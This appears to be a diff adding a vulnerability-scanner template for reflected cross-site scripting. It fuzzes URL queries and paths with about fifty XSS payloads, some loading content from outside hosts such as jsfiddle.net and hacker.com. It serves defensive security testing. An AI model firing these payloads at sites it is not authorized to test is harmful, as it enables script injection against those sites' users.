@@ -1,0 +1,103 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<img src\\x09=onerror=javascript:alert(1)//>"
+        - "<script>alert(1)</script"
+        - "<style>:target {color:red;}</style><optgroup id=x style=\"transition:color 1s\" ontransitionend=alert(1)></optgroup>"
+        - "<iframe/src=\"data:text/html,&lt;img/onerror=javascript:alert(1)&gt;\""
+        - "<style>:target {color:red}</style><noscript id=x style=\"transition:color 10s\" ontransitionrun=alert(1)></noscript>"
+        - "<img onmouseout=\"alert(1)\">test</img>"
+        - "<applet id=x onerror=javascript:alert(1)></applet>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><kbd ondragover=alert(1) contenteditable>drop here</kbd>"
+        - "<a onbeforecut=alert(1) href=\"\\x06javascript:javascript:alert(1)\" id=x>test</a>"
+        - "<audio onerror=javascript:alert(1)>"
+        - "<nobr onpaste=\"alert(1)\" contenteditable>test</nobr>"
+        - "<script xlink:href='data:text/html,<svg onload=alert&#40;1)&#41;'></"
+        - "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\">"
+        - "<script>alert(\"XSS\")</script>"
+        - "<basefont onclick=\"alert(1)\">test</basefont>"
+        - "<multicol draggable=\"true\" ondragleave=\"alert(1)\">test</multicol>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<body id=x tabindex=1 onfocusin=alert(1)></body>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&#10;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click"
+        - "<script>alert(\"XSS\");</script>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></object>"
+        - "<marquee><br/><br/>"
+        - "</s"
+        - "<style>@keyframes x{}</style><bdi style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdi>"
+        - "<iframe src=\"data:text/html,&lt;SCRIPT&gt;alert(&quot;XSS&quot;&gt;<"
+        - "<html xmlns=\"http://www.w3.org/1999/xhtml\"><head><style>:target {color:red;}</style><noscript id=x style=\"transition:color 1s\" ontransitionend=alert(1)></noscript>"
+        - "<html><body><iframe src=\"data:text/html&#61;&#111;<style>@keyframes slidein {}</style><img style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></body></html>"
+        - "<object data=//jsfiddle.net/XLE63/>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><h3 ondragover=alert(1) contenteditable>drop here</h3>"
+        - "<object id=x onerror=alert(1)>"
+        - "<object id=x type=image/gif data=xxx:x onerror=javascript:alert(1)></object><img src=x onload=alert(1)>"
+        - "<script/ >alert(1)</script>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \">"
+        - "<html:html xmlns:html='http://www.w3.org/1999/xhtml'>"
+        - "<input oncopy=\"alert(1)\" contenteditable>test</input>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><datalist ondrop=alert(1) contenteditable>drop here</datalist>"
+        - "<object data=//hacker.com/xss.swf type=image/png onloadend=alert(1)>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&#58;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<iframe/onerror=javascript:alert(1)>"
+        - "<script>alert(111)</script>"
+        - "<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>"
+        - "<object type=text/x-scriptlet data=\"http://jsfiddle.net/XLE63/ \"></object>"
+        - "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<multicol onbeforecut=\"alert(1)\" contenteditable>test</multicol>"
+        - "<embed code='http://jsfiddle.net/XLE63/ ' allowscriptaccess=always>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
